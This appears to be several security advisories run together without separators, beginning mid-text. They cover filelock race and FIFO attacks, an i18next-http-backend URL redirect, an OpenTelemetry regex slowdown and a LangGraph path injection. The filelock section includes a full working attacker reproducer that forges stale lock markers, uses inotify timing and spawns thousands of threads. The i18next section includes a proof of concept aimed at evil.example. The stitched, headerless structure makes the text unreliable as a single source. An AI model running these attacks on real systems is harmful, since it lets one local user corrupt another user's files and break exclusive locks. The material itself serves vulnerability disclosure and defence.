The scanner observed this with the hard link. `victim` runs `SoftReadWriteLock("/tmp/app.lock").write_lock(timeout=2)` and waits. `attacker`, who created `/tmp/app.lock.rw` first, renames a hard link to `/home/victim/accounts.csv` (mode `0600`, owner `victim`; the `attacker` account can neither read nor write it) over the record. The file keeps its size, owner and mode. It now begins `filelock-rw/1\ntoken=ea480210b6cacc96a657f16d93f7f284\npid=210\nhost=cfz?pidns-f0000217\nlease=90.0\nnonce=5f8f61dcf2607b56ef05c521bdade557\n`, followed by its original content from offset 135 on (the record length varies with the PID and the host name).

The same reopen with a FIFO: `open(fifo, O_WRONLY)` without `O_NONBLOCK` (the flag that makes such an open return at once) blocks until the FIFO has a reader. The scanner observed two cases on the image with its default settings.

In a waiting acquire, the code checks the deadline one level above the blocked call, so an `open` that does not return outlasts any `timeout`, and a `close()` from another thread. The lock user, with the FIFO in place of the hard link, is still inside `write_lock(timeout=2)` 12 s later, at `_storage.py:158 _attempt_open ← :143 _open ← :96 overwrite ← _protocol.py:545 _refresh_nonce ← :494 _keep_claim_fresh ← :464 advance ← _sync.py:584 _wait_for ← :512 _do_acquire_inner`; without the FIFO the same call raises `Timeout` after 2.0 s.

Inside filelock the only thing that ends the block is a peer's `read()` of the same name: its non-blocking open is a reader for a moment, the stuck open returns, and `write_all` then fails with `EPIPE` (broken pipe). Peers read a waiter's record only in `_sweep`, at most every `stale_threshold / 2` (`stale_threshold` is the age after which peers treat a record as abandoned). With a live holder on default settings `write_lock(timeout=2)` returned after 59.9 s with `BrokenPipeError` instead of `Timeout`, and with no live peer it was still blocked after 150 s. The blocked thread is also still inside `_acquire`'s `self._locks.transaction` section, so other threads acquiring through the same instance wait behind it.

For a holder's heartbeat, `heartbeat()` knows two failures. `overwrite` returning `False` is `lost`, an `OSError` is `transient`, and `_refresh` turns those into an `evicted` or a `refresh-failed` compromise. A blocked call is neither. With `heartbeat_interval=1, stale_threshold=3` and the FIFO renamed over the record after the grant: 6.5 s later `lock.compromise` is still `None`, `on_compromise` has not run, `release()` takes 2.0 s (the join timeout; 31 s with the default interval) and the `filelock-heartbeat-*` thread is still alive after it. For comparison, when someone deletes the record outright, the holder learns `evicted` at its next heartbeat.

When whoever planted the FIFO keeps it open with the pipe buffer full, the `open` succeeds and `write_all` is what blocks, and peers' reads no longer disturb it. Run that way with the same intervals, a second process read the record as `b""`, evicted the holder after `stale_threshold` and got the write lock 3.0 s later, while the first process was still in its critical section with `lock.compromise is None` and `on_compromise` not called.

## Impact

On a default Linux (`fs.protected_hardlinks=1`) the reachable effect is the FIFO hang. The other user makes a lock user's `acquire_read` / `acquire_write` / `read_lock` / `write_lock` hang whatever `timeout` the caller passed. That user could already keep the lock busy, in which case the lock user gets `Timeout` on time; the FIFO takes that away. Against a process that holds the lock, the FIFO stops the heartbeat thread, which is the only path by which a holder learns of its eviction. After `stale_threshold` (90 s by default) a second process takes the lock and nothing tells the first, so a live holder and its evictor both believe they hold the write lock and `on_compromise` does not run.

A user who owns the tree can already get a reader granted beside a live writer by writing one forged `gen/<N+1>` snapshot. What this bug adds is the acquire that outlasts its `timeout` and the heartbeat thread that does not return. The FIFO variant touches nothing outside the lock's own directory.

Where the kernel allows the hard link, a different local user corrupts files it has no access to, with the rights of the process that takes the lock. filelock's holder record replaces the first 135 bytes or so of the target. The other user does not choose the bytes, so the result is data destruction, not code execution: the header of a database or archive, the first lines of a configuration or credential file. This is the hard-link counterpart, on a derived name of the soft read-write lock, of the symbolic link fixes at the lock path recorded in the changelog (3.20.1 for lock file creation, 3.20.3 for `SoftFileLock`), which `O_NOFOLLOW` does not cover.

## Workarounds

- Keep the lock path in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share a `SoftReadWriteLock` between accounts through a `0777` or group-writable directory.
- In a sticky directory such as `/tmp`, make sure the locking account creates `<path>.rw` before anyone else can, and refuse to use a lock path whose `<path>.rw` belongs to another account.
- Keep `fs.protected_hardlinks=1` (the default on mainstream Linux distributions). It removes the file-overwrite variant, not the FIFO stall.

The stale-lock break shared by `SoftFileLock`, `MarkerSoftFileLock` and `SoftFileLease` (and their async variants, and a `FileLock` that has fallen back to a soft lock on `ENOSYS`, the "not implemented" error) recognises the marker it judged stale by two values. The marker is the lock file at `<path>`, whose presence says a process holds the lock. The values are its inode number (the kernel's identity for a file, independent of its name) and its modification time (mtime) not being newer. The check runs after the contender has already closed the marker, so nothing keeps the inode allocated.

On a filesystem that hands a freed inode number straight to the next file (ext4, xfs, overlayfs on them) the next holder's marker can carry that number. A contender still between its read and its break then renames and unlinks the live marker. Another local user (the other user below) who can create files in the lock's directory, a sticky `/tmp` included (the sticky bit is a directory flag that lets only a file's owner remove it), forces this at will. It plants a marker with a stale owner record and a modification time in the future and unlinks it as soon as a contender has read it. Two processes of the user running the lock (the lock user below) then hold the same default-configured lock at once, and nothing raises or logs. Affected versions: filelock >= 3.22.0 and <= 4.2.0 (finding `ANT-2026-KIIS96IX`).

## Severity

**CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N, 4.7 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:H` (high attack complexity): a race, though one the other user starts, lengthens (by making the lock user's `/proc` read slow) and retries at every release. The scanner measured 10 to 26 overlaps per 20-second run. `PR:L` (low privileges): an unprivileged account is enough. `UI:N` (no user interaction): the lock user's processes act on their own. `C:N` (no confidentiality impact): the other user reads nothing. `I:H` (high integrity impact): two holders write the data the lock protects, and neither learns of the other. `A:N` (no availability impact): the lock keeps working.

Classification from the review: security, conditional on a sticky shared directory, ext4-style inode reuse and at least two contenders of the lock user. Our review verified it across UIDs (a UID is a user account's numeric id): the other user as uid 1001, the lock user's processes as uid 1000, BUG on 4.2.0 over ext4. The scanner rated it high (CWE-367).

## Scope and preconditions

- The other user can create files in the lock's directory; a root-owned `1777` directory such as `/tmp` or `/var/tmp` is enough. It creates, `utime`s (sets the timestamps of) and unlinks only its own file. The sticky bit stops it removing the lock user's marker (checked: `EPERM`, operation not permitted), so the lock user's own stale break does the deletion.
- The directory is on a filesystem that hands a freed inode number straight to the next file. ext4 does (six create/unlink rounds returned one number six times, in the image's overlayfs `/tmp` and on a loop-mounted ext4), and xfs does. tmpfs returned six increasing numbers and the same run there gave no overlap, and btrfs does not hand a freed number back.
- The lock user has at least two processes contending for the lock, and the displaced holder is still inside when the next contender polls (the breaker itself comes back one `poll_interval`, 50 ms by default, later).
- The lock is `SoftFileLock`, `MarkerSoftFileLock` or `SoftFileLease` (or async forms). The default `flock`-based `FileLock` joins them only after it has fallen back to `SoftFileLock` on `ENOSYS`. `StrictSoftFileLock` does not call `break_lock_file`, so it is not affected.
- The same overlap also occurs with no other user involved, under heavy same-account contention, when a contender breaks a dead holder's marker and a successor creates its marker within the same timestamp tick (about once in 750 crashes with 64 workers on a 2-CPU machine, not on tmpfs).

filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.

## Mechanism

`_try_break_stale_lock` reads the marker through `_read_lock_file` (`lstat`, `O_RDONLY | O_NONBLOCK | O_NOFOLLOW` open, `fstat`, read, `close`), decides with `owner_is_stale` that the owner is gone, and calls `break_lock_file(lock_file, mtime, ino)`:

```python
# src/filelock/_util.py:113-118
if (current := os.lstat(lock_file)).st_mtime > mtime_before or current.st_ino != ino_before:
    return
break_path: Final[str] = f"{lock_file}.break.{os.getpid()}.{secrets.token_hex(16)}"
Path(lock_file).rename(break_path)
if (st_after := os.lstat(break_path)).st_mtime <= mtime_before and st_after.st_ino == ino_before:
    Path(break_path).unlink()
```

Between the `close` in `_read_lock_file` and the `lstat` on line 113 nothing keeps the inode allocated. An inode number identifies a file only while something holds that inode. The release path already says so ("Our open descriptor keeps the inode allocated, so its number cannot name a successor's marker yet"); the break path does not. That leaves the modification time, which the file's owner sets to any value and which the code compares by order. With two jobs A and B of the lock user and the other user:

1. The other user creates `app.lock` (inode `I`) with the record `<its own pid>\n<host>\n1\n` and sets its time to the year 2100 with `os.utime()`. A live PID with a wrong start token (the value that identifies one incarnation of a PID) is a recycled PID, so every contender judges the owner stale. On its own this marker only makes the lock user's processes wait: they cannot rename another user's file in a sticky directory (`EPERM`, and `acquire(timeout=1)` raises `Timeout`).
2. A polls, reads `(record, mtime=2100, ino=I)`, closes the file and enters `owner_is_stale()`.
3. The other user unlinks its marker. Inode `I` is free.
4. B polls. The path is empty, so `O_EXCL` (create only if absent) succeeds and ext4 gives the new marker inode number `I`. B holds the lock.
5. A reaches line 113 and looks at B's marker: its time (now) is not newer than 2100 and its inode number is `I`. A renames it (it is the lock user's own file, so the sticky bit does not object), line 117 passes for the same reason, and line 118 unlinks the live marker.
6. The path is empty again while B is still inside. The next contender to poll, A included, creates its marker and holds the lock as well.

When B releases, `_unlink_open_marker` finds another file at the path and leaves it alone, so neither side raises or logs anything. This is not the documented rename/link-back window: the code does not take the link-back branch and leaves no `app.lock.break.*` file behind. With a marker dated 2000, line 113 sees a newer time on B's marker and returns.

The other user does not need luck for the timing of step 3. It sees A's `close()` through inotify (a Linux facility that reports file events; here `IN_CLOSE_NOWRITE` on its own file), and it chooses how long A stays in `owner_is_stale()`. To compare the start token, `process_start_token()` reads `/proc/<pid>/stat`, and the kernel walks every thread of that process. Measured as `victim`, `owner_is_stale()` takes a median of 19 µs for a dead PID and 931 µs for a process with 8000 idle threads. Step 4 then needs another contender's 50 ms poll to fall into that millisecond, and the other user retries at every release of the lock.

A forged time is not required, only convenient. File times advance in 4 ms steps, so a successor's marker created in the same step as the stale marker's last write compares equal and passes `>` / `<=` too (8, 16 and 16 overlaps in three 20-second runs with the `os.utime()` call removed, and still 9 with the comparisons changed to `!=` / `==`). Outside a container the window is wider. With a bare hostname `owner_is_stale()` goes on to `_owner_runs_elsewhere()`, which reads `/proc/<pid>/stat` of every process on the machine (7 ms with 500 processes, 45 ms with 3000, against the default 50 ms `poll_interval`). With 3000 idle processes of the other user, both jobs of the lock user were inside at once in 12 and 13 of 30 rounds.

`MarkerSoftFileLock` and `SoftFileLease` read with `_read_lock_file()` and call `break_lock_file()` in the same way, and showed the same overlap when a stall held A 3 s in its `kill(pid, 0)` probe. The malformed-marker self-heal in `SoftFileLock` hands `break_lock_file()` values from the same closed descriptor. Where the lock user may rename the other user's file (it owns the sticky directory, or is root), the other user only acquires the free lock, dates the marker ahead and exits without releasing. The first contender then breaks that marker as designed and creates its own on the freed number, and a second contender that judged the planted marker before that break removes the live one. Two of the project's own tests at the scanned commit hit the same case without any other user (`test_stale_break_racing_a_successor_admits_no_third_holder`, `test_break_lock_file_leaves_a_swapped_in_symlink_aside`), failing in 10 of 14 runs on ext4.

## Reproduction

The scanner's reproducer for finding `ANT-2026-KIIS96IX`, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. The `repro` script drives the files under `repro.d/`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys

LOCK_DIR = "/tmp/shared-locks"
LOCK_PATH = f"{LOCK_DIR}/app.lock"
VICTIM_JOBS = 6
RUN_SECONDS = 20
JAN_1_2000 = 946684800
JAN_1_2100 = 4102444800

def run_victim_jobs_beside_attacker(stale_marker_mtime):
    # set up: an empty root-owned sticky directory, like /tmp (the sticky bit stops the attacker removing victim files)
    shutil.rmtree(LOCK_DIR, ignore_errors=True)
    os.mkdir(LOCK_DIR)
    os.chmod(LOCK_DIR, 0o1777)

    # run: nobody is paused or traced; the attacker and the victim's jobs just run side by side
    attacker = subprocess.Popen(
        [sys.executable, "/tmp/repro.d/plant_stale_markers.py", LOCK_PATH, str(stale_marker_mtime)],
        stdout=subprocess.PIPE,
        text=True,
        user="attacker",
        group="attacker",
        extra_groups=[],
    )
    try:
        assert attacker.stdout.readline() == "ready\n"
        jobs = [
            subprocess.Popen(
                [sys.executable, "/tmp/repro.d/victim_job.py", LOCK_PATH, str(RUN_SECONDS)],
                stdout=subprocess.PIPE,
                text=True,
                user="victim",
                group="victim",
                extra_groups=[],
            )
            for _ in range(VICTIM_JOBS)
        ]
        holds = []
        for number, job in enumerate(jobs):
            output, _ = job.communicate(timeout=RUN_SECONDS + 60)
            assert job.returncode == 0  # no Timeout or other exception reached the victim's code
            for line in output.splitlines():
                entered, left, is_locked = line.split()
                assert is_locked == "True"  # the job believed it held the lock
                holds.append((float(entered), float(left), f"job{number}"))
    finally:
        attacker.kill()
        attacker.wait()
    break_files = [name for name in os.listdir(LOCK_DIR) if ".break." in name]
    return sorted(holds), break_files

def overlapping_holds(holds):
    # time.monotonic() is CLOCK_MONOTONIC, one clock for every process on the host, so the intervals compare directly
    return [
        (first, second)
        for index, first in enumerate(holds)
        for second in holds[index + 1 :]
        if second[0] < first[1]  # sorted by entry: the second entered before the first had left
    ]

control_holds, _ = run_victim_jobs_beside_attacker(JAN_1_2000)
control_overlaps = overlapping_holds(control_holds)
print(f"CONTROL  attacker's stale markers dated 2000: {len(control_holds)} holds by {VICTIM_JOBS} victim jobs")
print(f"  two jobs inside the lock at once: {len(control_overlaps)} times")

attack_holds, break_files = run_victim_jobs_beside_attacker(JAN_1_2100)
attack_overlaps = overlapping_holds(attack_holds)
print(f"OBSERVED attacker's stale markers dated 2100: {len(attack_holds)} holds by {VICTIM_JOBS} victim jobs")
print(f"  two jobs inside the lock at once: {len(attack_overlaps)} times")
for (entered, left, job), (other_entered, other_left, other_job) in attack_overlaps[:3]:
    print(f"    {job} inside {entered:.3f}-{left:.3f}, {other_job} inside {other_entered:.3f}-{other_left:.3f}")
# the documented rename/link-back window of a stale break would strand a live marker as app.lock.break.*
print(f"  stale-break files left in {LOCK_DIR}: {break_files}")

# check: an exclusive lock with default options must never have two holders at once
print("BUG" if not control_overlaps and attack_overlaps else "OK")
```

**`repro.d/plant_stale_markers.py`**

```python
#!/usr/bin/env python3
import ctypes
import os
import sys
import threading
import time

from filelock import SoftFileLock

lock_path, marker_mtime = sys.argv[1], int(sys.argv[2])
IN_CLOSE_NOWRITE = 0x10
libc = ctypes.CDLL(None)

# contenders only judge markers written on their own host, so take the host string from a marker of our own
with SoftFileLock(lock_path):
    with open(lock_path) as own_marker:
        host = own_marker.read().splitlines()[1]

# <pid>\n<host>\n<start token>\n: this PID is alive but its start token is not 1, so it reads as a recycled PID
# and every contender judges the marker stale
stale_marker = f"{os.getpid()}\n{host}\n1\n".encode()

# To compare start tokens a contender reads /proc/<pid>/stat, and the kernel walks every thread of that process:
# with 8000 threads that is about 1 ms between the contender reading the marker and breaking it.
threading.stack_size(64 * 1024)
for _ in range(8000):
    threading.Thread(target=threading.Event().wait, daemon=True).start()
print("ready", flush=True)

while True:
    # plant the stale marker whenever the lock path is free
    try:
        fd = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o644)
    except FileExistsError:
        time.sleep(0.0002)
        continue
    os.write(fd, stale_marker)
    os.utime(fd, (marker_mtime, marker_mtime))  # a file's owner may give it any modification time
    os.close(fd)

    # once a contender has read it, unlink it: its inode number is free again for the next holder's marker
    inotify = libc.inotify_init()
    libc.inotify_add_watch(inotify, lock_path.encode(), IN_CLOSE_NOWRITE)
    os.read(inotify, 4096)
    os.unlink(lock_path)
    os.close(inotify)

    # creating anything before the next holder does would take that inode number away from it
    while not os.path.lexists(lock_path):
        time.sleep(0.0002)
```

## Attack sequence

```mermaid
sequenceDiagram
    participant X as other local user (uid 1001)
    participant P as app.lock (root-owned 1777 dir, ext4)
    participant A as process A of the lock user (uid 1000)
    participant B as process B of the lock user (uid 1000)
    X->>P: create "livepid host 1", utime to 2100 (inode I)
    A->>P: open, fstat (ino I, mtime 2100), read, close
    A->>A: owner_is_stale: recycled PID (slow: /proc read of X's 8000-thread process)
    rect rgb(255, 214, 214)
        X->>P: inotify IN_CLOSE_NOWRITE on own file: unlink it, I is free
        B->>P: O_CREAT|O_EXCL: new marker gets inode I, B holds and enters
        A->>P: lstat: mtime now <= 2100 and ino == I: rename to app.lock.break.*
        A->>P: lstat break name: same, unlink B's live marker
        A->>P: next poll 50 ms later: O_EXCL create, A enters beside B
        Note over A,B: B's release finds another inode, leaves it, no error on either side
    end
```

## Evidence

The scanner's reproducer runs six `victim` jobs (uid 1000) looping `with SoftFileLock("/tmp/shared-locks/app.lock"):` around 50 to 150 ms of work, printing `time.monotonic()` entry and exit and `lock.is_locked`, for 20 s. Beside them runs an `attacker` process (uid 1001) with 8000 idle threads that plants its marker whenever the path is free, waits for `IN_CLOSE_NOWRITE`, unlinks it and waits for the next `victim` marker. The control (markers dated 2000) prints `191 holds by 6 victim jobs, two jobs inside the lock at once: 0 times`. The disturbed run (dated 2100) prints `196 holds, two jobs inside the lock at once: 15 times`, for example `job3 inside 130.436-130.530, job5 inside 130.444-130.521`, with `stale-break files left in /tmp/shared-locks: []`. Six runs gave between 11 and 24 overlaps, 0 in each control, every `with` block ending without error with `is_locked == True`.

An `strace` of a landed round shows A's `close(4</tmp/app.lock>(deleted))`, B's `openat(O_WRONLY|O_CREAT|O_EXCL|...)` with `st_ino=296421`, and A's `lstat`, `rename`, `lstat`, `unlink` all on 296421, followed by B's `write(4</tmp/app.lock.break.32232.7d9f...>(deleted), ...)` and A's own create 53 ms later.

Our review ran the reproducer over a loop-mounted ext4 `/tmp` inside the container (the host's btrfs does not reuse a number). Result: BUG on 4.2.0 in 43 s, with the other user as uid 1001 against the lock user's processes as uid 1000; it created and unlinked only its own file in a root-owned `1777` directory. On btrfs the same run is OK, so the condition is the filesystem's inode allocation. On the head of #843 the run was OK with 0 overlaps in 193 holds.

## Impact

A local user who can create files in the lock's directory puts two processes of another user inside the same default-configured `SoftFileLock`, `MarkerSoftFileLock` or `SoftFileLease` at once, with no exception, no `lifetime`, no lease expiry and no `break_lock()` involved. Two holders then write the data the lock protects. `SoftFileLock` and `MarkerSoftFileLock` holders learn nothing. A displaced `SoftFileLease` holder got `compromise.reason == "owner-changed"` at its first heartbeat (the periodic refresh a lease holder runs) when the second holder's marker was still at the path, and `None` after 13 s when the second holder had already released.

It is a race, but the other user controls the start and the length of the window, and each failed attempt costs the lock user's processes one poll. Under the same interference with two processes of the lock user and 20 ms critical sections, 26 of 110 holds in 60 s found their own marker unlinked (`st_nlink == 0`, no name left for the file) while inside, without two holds overlapping. Not affected: tmpfs and btrfs, a lock with a single contender, `StrictSoftFileLock`.

## Workarounds

Keep soft locks in a directory other users cannot create files in (a `0700` directory of the lock's user) rather than a shared sticky directory, or place the lock directory on tmpfs, which does not reuse inode numbers. Where the native `FileLock` works (local ext4 with `flock`), prefer it over `SoftFileLock`. `StrictSoftFileLock` is not affected.

## Affected versions
Verified on 4.0.2 (latest on npm) and on commit 07e0288 (the GHSA-xvq9-wjp8-hwqf fix). Earlier 3.x/4.x versions that allow `/` in ns are likely affected too. Not verified on them.

## Impact
Same class as GHSA-xvq9-wjp8-hwqf and GHSA-q89c-q3h5-w34g: when an attacker controls the namespace value, the request goes to an attacker-chosen origin. In a browser this loads attacker-controlled translation JSON (content injection into the UI, and XSS where translations are rendered as HTML). The precondition is a template with `{{ns}}` right after a leading `/`, for example `/{{ns}}/{{lng}}.json`. The 4.0.2 maintainer note says templates with a leading `/` are safe. This case is outside that statement.

## Root cause
`isSafeNsUrlSegment` rejects any ns containing `//`, but allows a single leading `/` (needed for nested namespaces like `a/b`). Interpolation into `/{{ns}}/...` puts the template's own `/` next to the value's `/`. The result starts with `//`, which is a protocol-relative URL. The check runs on the value, not on the final URL.

## Minimal PoC
```js
import Backend from 'i18next-http-backend'
const b = new Backend(null, { loadPath: '/{{ns}}/{{lng}}.json',
  request: (opts, url, payload, cb) => { console.log(url, '->', new URL(url, 'https://app.example/').origin); cb(null, { status: 200, data: '{}' }) } })
b.read('en', '/evil.example', () => {})
```
Observed on 4.0.2:
```
POC ns=/evil.example  loadPath=/{{ns}}/{{lng}}.json => url=//evil.example/en.json  origin in page https://app.example/ = https://evil.example
```

## Negative controls (same run)
- ns `//evil.example`: rejected ("unsafe lng/ns value").
- lng `http:127.0.0.1:9` (the GHSA-xvq9 payload): rejected.
- ns `common` and nested ns `a/b`: `common/en.json` and `a/b/en.json`, same origin.

## Suggested fix
Validate the final interpolated URL, not just the values: reject it if it starts with `//` or `\`, or if it has a scheme or host the template did not have. The advisory already recommends this ("parse the final URL and require it to remain within the intended origin and path"). Alternatively, reject an ns that starts with `/`.

## Disclosure
We intend to keep this private for 90 days from the date of the report, or until a fixed release is available, whichever comes first, and are happy to adjust if you need more time.

## Re-verification
Re-run on 2026-10-14 against the same latest release. The PoC still reproduces and the negative controls still hold.

Reported by Zachariah Mithani.

## Maintainer note

Confirmed and fixed in 4.0.3 (commit i18next/i18next-http-backend@042c3d4).

**Preconditions.** The `loadPath` / `addPath` template must put `{{ns}}` directly after a leading `/` (for example `/{{ns}}/{{lng}}.json`), and the attacker must control the namespace value. Applications usually set namespaces in code rather than from user input. The default `/locales/{{lng}}/{{ns}}.json`, templates with an origin, and templates with a fixed path segment before `{{ns}}` are not affected. Only browsers are affected: in Node, `fetch('//host/...')` fails because there is no base URL to resolve against. XSS additionally requires the application to render translations as HTML.

**Fix.** The 4.0.2 `//` check looked at each value on its own and could not see the `/` the template puts in front of it. `interpolateUrl` now also checks the interpolated URL: it may only start with `//` or `\` if the template itself does. Protocol-relative CDN templates such as `//cdn.example/{{lng}}/{{ns}}.json` keep working.

**Affected range.** Versions before 3.0.5 had no value validation at all and are reachable through this vector too, so the affected range is `< 4.0.3`.

**Related.** i18next-fs-backend had the same class of problem for file paths (a leading `/` in `ns`, or `C:` in `lng`, changing the root of a path built from a template that starts with the placeholder). It is fixed in i18next-fs-backend 2.6.9.

### Summary

OpenTelemetry Java's W3C trace-context propagator permits excessive CPU consumption when extracting crafted `tracestate` headers, potentially leading to denial of service. Regex backtracking causes quadratic parsing time for headers containing long runs of spaces or tabs without a following comma.

### Impact

An unauthenticated attacker whose headers reach `W3CTraceContextPropagator.extract()` can cause excessive CPU usage through crafted requests. Parsing blocks the calling thread, potentially affecting other connections when extraction runs on a shared event-loop thread. Actual impact depends on ingress header-size limits, proxy configuration, and threading. Header-size limits reduce the per-request cost but do not eliminate the vulnerability.

### Patches

Upgrade `io.opentelemetry:opentelemetry-api` to version **1.67.0** or later. [PR #8914](https://github.com/open-telemetry/opentelemetry-java/pull/8914) replaces regex delimiter splitting with literal comma scanning and explicit whitespace trimming.

### Workarounds

If upgrading is not possible, reject or remove oversized `tracestate` headers before trace-context extraction. This reduces the per-request parsing cost but does not eliminate the risk from repeated requests.

### Summary

The LangGraph Python SDK v3 streaming client interpolates caller-supplied `thread_id` and `assistant_id` values into request paths without encoding them at four synchronous and asynchronous call sites. Relative path segments can therefore redirect an authenticated GET request to another path on the same configured server.

### Details

The affected `get_tree` and `_fetch_state` implementations build request paths from raw identifiers rather than passing each identifier through the SDK's existing `_quote_path_param` helper. HTTP path normalization can collapse values containing relative segments before dispatch while retaining the client's authentication headers.

`langgraph-sdk` versions 0.4.0 through 0.4.5 are affected. The v3 stream module is not present in the 0.3.x release line.

`RemoteGraph` v3 streaming in `langgraph` 1.2.3 and later is also affected when used with a vulnerable `langgraph-sdk` version. It passes `config["configurable"]["thread_id"]` into `threads.stream(...)`, and its dependency range permits affected SDK versions.

### Impact

An application is affected only if it passes attacker-controlled text as a streaming `thread_id` or `assistant_id`. In that configuration, an attacker may select another readable path on the configured server and cause the SDK to return that response to the application. Through `thread_id`, the attacker can also control the query string, for example by targeting `/store/items?namespace=...&key=...`; `assistant_id` controls only the path. The affected requests are GET operations, so this issue does not provide a write primitive.

The LangGraph Platform is not exposed to this issue.

### Remediation

Upgrade `langgraph-sdk` to version 0.4.6 or later. The fix encodes `assistant_id` in `get_tree` and `thread_id` in `_fetch_state` with `_quote_path_param` in both synchronous and asynchronous stream modules.

If you use `RemoteGraph`, also upgrade `langgraph` to version 1.2.14 or later, which requires `langgraph-sdk>=0.4.6`.
